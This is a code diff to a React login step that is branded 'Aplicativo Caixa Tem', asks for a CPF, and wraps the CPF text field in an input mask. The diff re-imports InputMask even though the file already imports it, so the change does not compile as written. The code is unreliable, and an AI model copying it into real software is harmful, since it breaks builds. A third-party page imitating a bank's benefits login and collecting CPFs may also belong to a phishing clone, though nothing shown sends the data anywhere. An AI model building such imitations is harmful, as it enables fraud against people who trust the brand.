@@ -6,6 +6,9 @@ import InputMask from 'react-input-mask'
 import logo from '../Assets/Images/logo.png'
 import Loader from '../Components/Loader';
 
+import InputMask from 'react-input-mask'
+
+
 const useStyles = makeStyles((theme) => ({
     root: {
         display: 'flex',
@@ -54,8 +57,10 @@ const Step1 = ({ nextStep, loginData, setLoginData }) => {
        <img src={logo} className="logo" />
             <h2>Aplicativo Caixa Tem</h2>
 
-            <p>Informe seu CPF e clique em "Próximo" para continuar:</p>
+            <p> Informe seu CPF e clique em "Próximo" para continuar: </p>
             <div>
+            <InputMask mask="999.999.999-99" value={loginData.usuario} onChange={onChangeUser}>
+                    {(inputProps) =>
                 <TextField
                     label="CPF"
                     name="CPF"
@@ -66,6 +71,8 @@ const Step1 = ({ nextStep, loginData, setLoginData }) => {
                     className={classes.textField}
                 //   helperText="Some important text"
                 />
+                }
+                </InputMask>
             </div>
         
 
